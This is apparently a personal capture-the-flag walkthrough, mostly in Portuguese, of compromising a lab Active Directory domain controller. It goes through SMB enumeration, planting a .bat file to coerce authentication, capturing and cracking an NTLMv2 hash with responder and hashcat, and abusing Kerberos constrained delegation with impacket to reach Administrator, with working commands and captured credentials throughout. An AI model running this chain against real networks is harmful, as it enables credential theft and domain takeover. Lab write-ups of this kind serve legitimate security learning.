ip 10.67.161.109
ver se o ip esta ativo 
- Comando : fping 10.65.133.67
---------------------------------------------------------------

Porta aberta e serviço e version 

- Comando : nmap -sV -sC 10.65.133.67
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-16 16:51:55Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-10-16T16:52:36+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   DNS_Tree_Name: ctf.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-10-16T16:51:56+00:00
| ssl-cert: Subject: commonName=DC01.ctf.local
| Not valid before: 2026-05-19T02:27:27
|_Not valid after:  2026-11-18T02:27:27
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-16T16:51:57
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.40 seconds


- ------------------------------- 
usando o enum4linux para fazer enumeração 


- Comando : 
             enum4linux -A 10.65.133.67	
						 					
Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp


[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[+] Server allows authentication via username 'ffonzqjb' and password ''
[H] Rerunning enumeration with user 'ffonzqjb' might give more results

- Nota : Aquie da para ver que podemos fazer acesso como um utlizador anonymous, então usei o 
- Comando : 
 							enum4linux -A -u 'guest' -p '' 10.65.133.67
Esse comando revela mais usurarios e grupos e compartilhamentos do que a execuçao puramente 

Rusultado do comando  
 Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share IT-Shared
[+] Mapping: OK, Listing: OK
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: DENIED
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: DENIED

Ou tambem pode ser usado o smbclient para ter acesso e enumerar grupo e utlizado e compartilhamento 

- Comando : smbclient -L //10.65.133.67 -N

Resultado :

Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT-Shared       Disk      IT Department Shared Resources
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

como esse resultado eu esplorei o diretorio : IT-Shared ,  NETLOGON, SYSVOL

- Comando : smbclient //10.67.161.109/IT-Shared -N

Resultado : 
smb: \> ls
  .                                   D        0  Fri May 22 03:19:03 2026
  ..                                  D        0  Fri May 22 03:19:03 2026
  IT-Credentials-Backup.txt           A      406  Fri May 22 03:18:15 2026
  IT-Onboarding-Checklist.txt         A      676  Fri May 22 03:18:16 2026
  IT-Portal.html                      A     4887  Fri May 22 03:19:03 2026

Dentro do Compartilhamento de IT-Shared há tres aquivos e baixar para ver o qual e o contiudo usando o 
- comando
 	 				get IT-Credentials-Backup.txt 
					get IT-Onboarding-Checklist.txt 
					get IT-Portal.html 
E os outro dois compartimento estavam vazio.


------------ 
Fiz um analise dos arquivo "IT-Credentials-Backup.txt" encontrei duas conta de 
helpdesk.bob : wolcome123!
it.admin : ITAdmin2019!

Mas essa duas conta ja foram desativadas  e ela são geridos separadmente pela equipa sysadmin 

Ao fazer analise no arquvio "IT.Onboarding-Checklist.txt" encontrei umas informações muito importante 

1. Obtenha acesso VPN do administrador de sistemas
2.º Solicite conta AD
3. Instale ferramentas (ver lista de software na intranet)
4.º Reveja as políticas de segurança

Serviços Automatizados
------------------
Verificador de ficheiros (svc.scanner)
Funciona a cada 2 minutos. Enumera IT-Shared para novos ficheiros serem processados. 
Utiliza a enumeração Shell para inspecionar metadados e ícones de ficheiros. 
Contacte o sysadmin se os ficheiros não estiverem a ser processados. 

Backup de base de dados (svc.mssql)
Lida com backups MSSQL noturnos. Membro dos Operadores de Backup. 
A palavra-passe é alternada trimestralmente – não armazenar localmente.

A Pergunta é o que eu devo fazer como essa informação 

1. onde encontra o aquivo svc.scanner 
2. O Enumeração do IT-shared para novos ficheiros seram processado a cada 2 minitos 
3. Tem que fazer um enumeração de sjell para inspecionar metadados e icoens de ficheiros.

1. procurei o arquivo mas não encontrei no smb mas usei o 
- securse ON
- get *scanner*
 
 - Então pensei em usar um shell de arquivo .bat para procurar aquivo em share do deretorio do windows e faz captura do contiudo atravez do "responder"
 
 criar um arquivo 
 shell.bat
 
 @echo off
 dir \\10.65.133.67\share > nul 2>&1

Esse comando shell tenta listar o contéúdo de um determinado SMB e descartar toda a saida 

- Depois coloquei o arquivo shell.bat em no smb IT-Shared
- Comando : smbclient //10.67.161.109/IT-Shared -N
- smb \ : put shell.bat

Depois executei o o responder 
fiz uma anlaise com o comano 
- Comando : ip add
vi que o ip da maquina esta no ens5 

- Comando :  responder -I ens5 -v

como isso consgue fazer a capitura de um hash 

SMB] NTLMv2-SSP Client   : 10.65.133.67
[SMB] NTLMv2-SSP Username : CTF\svc.scanner
[SMB] NTLMv2-SSP Hash     : svc.scanner::CTF:6bfc7ae541c7e384:246901F05E9A5E12D2769968FD01DE42:010100000000000080D2C8DE9B5DDD01CAA04E14A0596B470000000002000800470035004900560001001E00570049004E002D005000460048004500390031003500300049003200320004003400570049004E002D00500046004800450039003100350030004900320032002E0047003500490056002E004C004F00430041004C000300140047003500490056002E004C004F00430041004C000500140047003500490056002E004C004F00430041004C000700080080D2C8DE9B5DDD0106000400020000000800300030000000000000000100000000200000B1D96C52D31F03D0302BA81B1CC5A76C15B311414FDCB69C4EA7A8EADF7094320A001000000000000000000000000000000000000900220063006900660073002F00310030002E00360035002E00390037002E003200330033000000000000000000


Depois desso usei um site : https://nth.skerritt.blog/ para ver qual foi o tipo de hash e qual e o seu tanho
Depois usei o hashcat para quebra e hash para ver a senha 
- Comando :  hashcat -m 5600 hasht.tx rockyou.txt
senha : 1summerlove






```
smbclient -L //10.128.146.136 -N

smbclient //10.128.146.136/IT-Shared -N
```
```
test.bat

@echo off
dir \\10.128.96.80\share > nul 2>&1
```
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```
```
nxc smb 10.128.146.136 -u 'svc.scanner' -p '1summerlove!'
```
```
/etc/hosts

10.128.146.136 DC01.ctf.local ctf.local DC01
```
```
nxc smb 10.128.146.136 -d ctf.local -u 'svc.scanner' -p '1summerlove!' --shares

smbclient -L //10.128.146.136 -U 'ctf.local/svc.scanner%1summerlove!'
```
```
check if account has access to winrm

nxc winrm 10.128.146.136 -d ctf.local -u 'svc.scanner' -p '1summerlove!'
```
```
nxc smb 10.128.146.136 -d ctf.local -u 'svc.scanner' -p '1summerlove!' --users
nxc smb 10.128.146.136 -d ctf.local -u 'svc.scanner' -p '1summerlove!' --groups
nxc smb 10.128.146.136 -d ctf.local -u 'svc.scanner' -p '1summerlove!' --pass-pol
```
```
nxc smb 10.128.146.136 -d ctf.local -u 'svc.scanner' -p '1summerlove!' --rid-brute
```
```
bloodhound-python -u svc.scanner -p '1summerlove!' -d ctf.local -ns 10.128.146.136 -dc DC01.ctf.local -c all
```
```
bloodhound-python -u svc.scanner -p '1summerlove!' -d ctf.local -ns 10.128.146.136 -c All --zip
```
```
impacket.findDelegation ctf.local/svc.scanner:'1summerlove!' -dc-ip 10.128.146.136
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
```
```
AccountName  AccountType  DelegationType                      DelegationRightsTo   SPN Exists 
-----------  -----------  ----------------------------------  -------------------  ----------
svc.scanner  Person       Constrained w/ Protocol Transition  cifs/DC01            No         
svc.scanner  Person       Constrained w/ Protocol Transition  cifs/DC01.ctf.local  No
```


svc.scanner is allowed to ask Kerberos:
 "Give me a ticket to access CIFS on DC01 as another user."
 
Because protocol transition was enabled, it could do that even without the target user’s password.

```
impacket.getST   -spn cifs/DC01.ctf.local   -impersonate Administrator   -dc-ip 10.128.146.136   ctf.local/svc.scanner:'1summerlove!'
```

getST abused Kerberos S4U. performed two Kerberos steps internally:

S4U2Self  -> ask for a ticket representing Administrator to svc.scanner
S4U2Proxy -> use that to request a service ticket to cifs/DC01 as Administrator

in case of issue: unset KRB5CCNAME

```
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache

impacket.smbexec -k -no-pass ctf.local/Administrator@DC01.ctf.local
```

--- attackbox --
```
findDelegation.py ctf.local/svc.scanner:'1summerlove!' -dc-ip 10.128.146.136

getST.py -spn cifs/DC01.ctf.local   -impersonate Administrator   -dc-ip 10.128.146.136   ctf.local/svc.scanner:'1summerlove!'

export KRB5CCNAME=Administrator.ccache

smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
```